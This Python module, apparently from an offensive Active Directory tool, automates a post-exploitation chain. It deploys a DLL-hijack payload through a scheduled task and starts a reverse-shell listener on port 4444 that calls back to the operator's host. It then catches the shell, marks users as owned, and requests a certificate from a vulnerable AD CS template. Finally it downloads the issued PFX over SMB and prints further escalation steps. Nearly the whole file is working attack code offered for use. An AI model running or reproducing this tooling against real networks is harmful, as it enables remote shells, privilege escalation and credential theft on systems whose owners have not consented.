from __future__ import annotations

import json
import re
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING

from admapper.core.output import print_info, print_success, print_warning
from admapper.creds.common import pick_dc_ip, resolve_dc_fqdn
from admapper.postex.pe_arch import TargetArch
from admapper.postex.payload import PayloadMode
from admapper.postex.creds import resolve_winrm_cred
from admapper.postex.deploy import deploy_dll_hijack
from admapper.postex.listener import ReverseShellListener, start_listener
from admapper.winrm.client import WinRMClient
from admapper.winrm.factory import winrm_client_for_cred

if TYPE_CHECKING:
    from admapper.core.session import Session


@dataclass
class RunResult:
    deploy_remote_path: str
    run_as_user: str
    callback_ip: str = ""
    shell_output: str = ""
    monitor_excerpt: str = ""
    shell_connected: bool = False
    enroll_success: bool = False
    pfx_remote: str = ""
    enroll_log_excerpt: str = ""
    errors: list[str] = field(default_factory=list)


def _winrm_client_from_cred(cred, session: Session | None = None) -> WinRMClient:
    return winrm_client_for_cred(cred, session)


def _poll_enroll_outcome(
    client: WinRMClient,
    *,
    dns_name: str,
    timeout: int,
    deploy_marker: str = "",
    expect_user: str = "",
    drop_path: str = r"C:\ProgramData",
) -> tuple[bool, str, list[str]]:
    """Wait for remote PFX; read enroll.log after deploy marker."""
    from admapper.adcs.enroll import parse_enroll_log

    drop = drop_path.rstrip("\\/")
    remote_pfx = f"{drop}\\{dns_name}.pfx"
    log_path = f"{drop}\\enroll.log"
    safe_pfx = remote_pfx.replace("'", "''")
    safe_log = log_path.replace("'", "''")
    deadline = time.time() + max(timeout, 0)
    last_log = ""
    while time.time() < deadline:
        proc = client.execute(f"Test-Path -LiteralPath '{safe_pfx}'", shell="powershell")
        if "True" in (proc.stdout or ""):
            return True, last_log, []
        log_proc = client.execute(
            f"if(Test-Path -LiteralPath '{safe_log}'){{Get-Content -LiteralPath '{safe_log}' -Tail 60}}",
            shell="powershell",
        )
        last_log = (log_proc.stdout or "").strip()
        if deploy_marker and deploy_marker not in last_log:
            time.sleep(20)
            continue
        if deploy_marker and "=== enroll" not in last_log.lower():
            time.sleep(20)
            continue
        status = parse_enroll_log(
            last_log,
            since_marker=deploy_marker or None,
            expect_user=expect_user or None,
        )
        if status.success:
            return True, last_log, []
        if status.present and status.errors and "=== enroll" in last_log.lower():
            return False, last_log, status.errors
        time.sleep(20)
    status = parse_enroll_log(
        last_log,
        since_marker=deploy_marker or None,
        expect_user=expect_user or None,
    )
    errors = status.errors or (
        ["PFX not issued within timeout — wait for the scheduled task to run"]
        if not status.success
        else []
    )
    return False, last_log, errors


def _target_ips(session: Session) -> set[str]:
    ips: set[str] = set()
    dc = pick_dc_ip(session)
    if dc:
        ips.add(dc)
    if session.workspace:
        from admapper.core.hosts import HostsStore

        for host in HostsStore(session.workspaces, session.workspace.name).list():
            if host.address:
                ips.add(host.address)
    return ips


def _load_scan(ws_path: Path) -> dict:
    path = ws_path / "postex_scan.json"
    if not path.is_file():
        return {}
    return json.loads(path.read_text(encoding="utf-8"))


def _monitor_log_script(intel_path: str | None, drop_path: str) -> str:
    candidates: list[str] = []
    if intel_path:
        candidates.append(intel_path.replace("'", "''"))
    base = drop_path.rstrip("\\/")
    candidates.extend(
        [
            f"{base}\\Logs\\monitor.log",
            f"{base}\\logs\\monitor.log",
            f"{base}\\monitor.log",
        ]
    )
    seen: set[str] = set()
    checks: list[str] = []
    for path in candidates:
        key = path.lower()
        if key in seen:
            continue
        seen.add(key)
        checks.append(
            f"if(Test-Path -LiteralPath '{path}')"
            f"{{Get-Content -LiteralPath '{path}' -Tail 15;break}}"
        )
    return ";".join(checks) if checks else "Write-Output 'no monitor log path'"


def parse_shell_username(probe_output: str) -> str:
    """Extract DOMAIN\\user or user from reverse-shell probe / whoami output."""
    for line in probe_output.splitlines():
        stripped = line.strip()
        if not stripped or "whoami" in stripped.lower():
            continue
        exact = re.search(r"^([\w.-]+\\[\w$.-]+)\s*$", stripped, re.I)
        if exact:
            return exact.group(1).split("\\")[-1]
        inline = re.search(r"\b([\w.-]+\\[\w$.-]+)\b", stripped, re.I)
        if inline:
            return inline.group(1).split("\\")[-1]
    return ""


def _resolve_enroll_targets(session: Session) -> tuple[str, str, str]:
    """Return (dns_fqdn, ca_host, ca_name) from workspace intel."""
    domain = (session.workspace.domain if session.workspace else None) or ""
    if not domain:
        raise RuntimeError("no domain set in workspace — cannot infer enrollment targets")
    ws_path = session.workspaces.path_for(session.workspace.name)  # type: ignore[union-attr]
    dc_ip = pick_dc_ip(session)
    dns = resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or f"dc01.{domain.lower()}"
    prefix = domain.split(".")[0] if domain else ""
    ca_name = f"{prefix or 'AD'}-DC01-CA"
    inv_path = ws_path / "adcs_inventory.json"
    if inv_path.is_file():
        try:
            inv = json.loads(inv_path.read_text(encoding="utf-8"))
            ca_name = str(inv.get("ca_name") or ca_name)
        except (json.JSONDecodeError, OSError):
            pass
    return dns, dns, ca_name


def _handle_pivot_shell(session: Session, run_as_user: str, probe_output: str) -> None:
    """After shell as pivot target, show next escalate step and local AD CS enroll script."""
    parsed = parse_shell_username(probe_output)
    effective_user = parsed or run_as_user
    if not effective_user or effective_user == "unknown":
        return
    whoami = probe_output.lower()
    if run_as_user.lower() not in whoami and parsed.lower() not in whoami:
        if parsed:
            effective_user = parsed
        else:
            return
    try:
        from admapper.adcs.enroll import build_local_enroll_powershell, load_enroll_profile
        from admapper.adcs.runner import run_certipy_enrollment
        from admapper.escalate.analyze import run_escalate_analysis

        ws_path = session.workspaces.path_for(session.workspace.name)  # type: ignore[union-attr]
        certs_dir = ws_path / "certs"
        certs_dir.mkdir(parents=True, exist_ok=True)
        enroll_dns, enroll_ca_host, enroll_ca_name = _resolve_enroll_targets(session)
        profile = load_enroll_profile(
            session,
            template="UpdateSrv",
            dns_name=enroll_dns,
            ca_host=enroll_ca_host,
            ca_name=enroll_ca_name,
            run_as_user=effective_user,
        )
        ps = build_local_enroll_powershell(
            template="UpdateSrv",
            dns_name=enroll_dns,
            profile=profile,
            run_as_user=effective_user,
        )
        script = certs_dir / f"enroll_{effective_user.replace('.', '_')}.ps1"
        script.write_text(ps + "\n", encoding="utf-8")
        print_info(f"pivot shell as {effective_user} — NEXT: WSUS + vulnerable template cert chain")
        print_info("in shell: powershell -ep bypass -File <drop_path>\\enroll.ps1")
        print_info("or: admapper postex run --mode enroll (DLL auto-enroll on task trigger)")
        run_escalate_analysis(session, pivot_user=effective_user)
        result = run_certipy_enrollment(session, finding_id="adcs-002", dns_name=enroll_dns)
        if result.success and result.pfx_path:
            print_success(f"cert issued → {result.pfx_path}; next: admapper wsus / pywsus")
    except Exception as exc:
        print_warning(f"pivot shell follow-up: {exc}")


def run_dll_hijack(
    session: Session,
    *,
    op_id: str | None = None,
    cred_id: str | None = None,
    lhost: str | None = None,
    lport: int = 4444,
    payload_dll: Path | None = None,
    wait_seconds: int = 180,
    dry_run: bool = False,
    arch: TargetArch | None = None,
    use_ncat: bool = False,
    no_listener: bool = False,
    payload_mode: PayloadMode = "shell",
    enroll_template: str = "UpdateSrv",
    enroll_dns: str | None = None,
    enroll_ca_name: str | None = None,
    enroll_ca_host: str | None = None,
    auto_chain: bool | None = None,
) -> RunResult:
    """Fully automated: detect VPN IP, msfvenom, listener, deploy, poll, catch shell."""
    if session.workspace is None:
        raise RuntimeError("no active workspace")

    from admapper.core.connectivity import TargetUnreachableError, format_unreachable_message, require_target_reachable
    from admapper.models.workspace import OperationMode

    if not dry_run and session.workspace.mode == OperationMode.AUTO:
        try:
            require_target_reachable(session)
        except TargetUnreachableError as exc:
            raise RuntimeError(format_unreachable_message(exc)) from exc

    default_dns, default_ca_host, default_ca_name = _resolve_enroll_targets(session)
    enroll_dns = enroll_dns or default_dns
    enroll_ca_host = enroll_ca_host or default_ca_host
    enroll_ca_name = enroll_ca_name or default_ca_name

    ws_path = session.workspaces.path_for(session.workspace.name)
    exclude = _target_ips(session)
    listener: ReverseShellListener | None = None

    try:
        if not no_listener and not dry_run and payload_mode == "shell":
            if use_ncat:
                print_info(f"external listener required: ncat -lvnp {lport} on your LHOST")
            else:
                print_info(f"starting built-in reverse-shell listener on 0.0.0.0:{lport} (set ADMAPPER_LHOST)")
            listener = start_listener(lport, use_ncat=use_ncat)

        deploy = deploy_dll_hijack(
            session,
            op_id=op_id,
            cred_id=cred_id,
            lhost=lhost,
            lport=lport,
            payload_dll=payload_dll,
            dry_run=dry_run,
            exclude_ips=exclude,
            arch=arch,
            payload_mode=payload_mode,
            enroll_template=enroll_template,
            enroll_dns=enroll_dns,
            enroll_ca_name=enroll_ca_name,
            enroll_ca_host=enroll_ca_host,
        )

        if dry_run:
            return RunResult(
                deploy_remote_path=deploy.remote_path,
                run_as_user=deploy.run_as_user,
            )

        print_info(
            f"waiting up to {wait_seconds}s for task '{deploy.task_name}' (runs as {deploy.run_as_user})"
        )

        scan = _load_scan(ws_path)
        finding = (scan.get("findings") or [{}])[0]
        drop_path = str(finding.get("drop_path") or r"C:\ProgramData")
        monitor_path = None
        excerpt = str(scan.get("monitor_log_excerpt") or "")
        for line in excerpt.splitlines():
            if ".log" in line.lower() and ":\\" in line:
                for part in line.split():
                    if part.lower().endswith(".log") and ":\\" in part:
                        monitor_path = part.strip("'\"")
                        break

        cred = resolve_winrm_cred(
            session,
            shell_user=deploy.shell_user,
            cred_id=cred_id,
            host=str(scan.get("dc_ip") or ""),
        )
        client = _winrm_client_from_cred(cred, session)

        script = _monitor_log_script(monitor_path, drop_path)
        deadline = time.time() + max(wait_seconds, 0)
        last_out = ""
        poll_interval = 20
        while time.time() < deadline:
            remaining = int(deadline - time.time())
            if listener and listener.capture.connected:
                break
            try:
                proc = client.execute(script, shell="powershell")
                last_out = (proc.stdout or "").strip()
                if last_out and last_out != "no monitor log path":
                    lowered = last_out.lower()
                    if "error code: 126" not in lowered or deploy.run_as_user.lower() in lowered:
                        print_info("monitor.log: task activity detected")
            except Exception as exc:
                print_warning(f"monitor poll: {exc}")

            if listener:
                snap = listener.wait(timeout=min(poll_interval, max(remaining, 1)))
                if snap.connected:
                    break

            if remaining <= 0:
                break
            print_info(f"waiting for shell / task ({remaining}s left) …")
            time.sleep(min(poll_interval, remaining))

        shell_connected = False
        shell_output = ""
        callback_ip = deploy.callback_ip or lhost or ""
        if listener:
            cap = listener.capture
            shell_connected = cap.connected
            shell_output = cap.output
            if cap.connected and cap.output:
                print_success("shell probe output:")
                print_info(cap.output[:1200])
                _handle_pivot_shell(session, deploy.run_as_user, cap.output)

        shell_user = deploy.run_as_user
        if shell_connected and shell_output:
            parsed = parse_shell_username(shell_output)
            if parsed:
                shell_user = parsed

        if shell_connected and shell_user and shell_user != "unknown":
            try:
                from admapper.engage.auto import finalize_postex_shell

                finalize_postex_shell(
                    session,
                    username=shell_user,
                    probe_output=shell_output,
                    auto_chain=auto_chain,
                )
            except Exception as exc:
                print_warning(f"postex finalize: {exc}")
                if session.workspace and shell_user not in session.workspace.owned_users:
                    from admapper.escalate.analyze import mark_user_owned, record_escalation_step

                    mark_user_owned(session, shell_user, refresh=False)
                    record_escalation_step(
                        session,
                        action="dll_hijack_shell",
                        detail=f"postex → {shell_user}",
                    )
                    session.persist_workspace()
                    print_success(f"added owned user: {shell_user}")

        enroll_success = False
        enroll_log_excerpt = ""
        enroll_errors: list[str] = []
        pfx_remote = f"{drop_path.rstrip('\\/')}\\{enroll_dns}.pfx"
        if payload_mode == "enroll" and not dry_run:
            enroll_success, enroll_log_excerpt, enroll_errors = _poll_enroll_outcome(
                client,
                dns_name=enroll_dns,
                timeout=wait_seconds,
                deploy_marker=deploy.enroll_deploy_marker,
                expect_user=deploy.run_as_user,
                drop_path=drop_path,
            )
            if enroll_success:
                print_success(f"enroll issued PFX on target → {pfx_remote}")
                try:
                    from admapper.adcs.runner import fetch_pfx_via_smb

                    local_pfx = fetch_pfx_via_smb(
                        session, remote_name=f"{enroll_dns}.pfx", drop_path=drop_path
                    )
                    if local_pfx:
                        print_success(f"PFX downloaded → {local_pfx}")
                except Exception as exc:
                    print_warning(f"PFX SMB fetch: {exc}")
                if session.workspace and deploy.run_as_user not in session.workspace.owned_users:
                    from admapper.escalate.analyze import mark_user_owned, record_escalation_step

                    mark_user_owned(session, deploy.run_as_user, refresh=False)
                    record_escalation_step(
                        session,
                        action="enroll_hijack",
                        detail=f"enroll PFX as {deploy.run_as_user}",
                    )
                    session.persist_workspace()
            else:
                for err in enroll_errors:
                    print_warning(f"enroll: {err}")
                if enroll_log_excerpt:
                    print_info("enroll.log (tail):")
                    for line in enroll_log_excerpt.splitlines()[-10:]:
                        print_info(f"  {line}")

        if not shell_connected and listener:
            print_warning(f"no reverse shell within {wait_seconds}s — task may need more time")
            if last_out:
                print_info("monitor.log (last poll):")
                for line in last_out.splitlines()[-8:]:
                    print_info(f"  {line}")

        return RunResult(
            deploy_remote_path=deploy.remote_path,
            run_as_user=deploy.run_as_user,
            callback_ip=callback_ip,
            shell_output=shell_output,
            monitor_excerpt=last_out,
            shell_connected=shell_connected,
            enroll_success=enroll_success,
            pfx_remote=pfx_remote if enroll_success else "",
            enroll_log_excerpt=enroll_log_excerpt,
            errors=[] if enroll_success or payload_mode != "enroll" else enroll_errors,
        )
    finally:
        if listener is not None:
            listener.close()
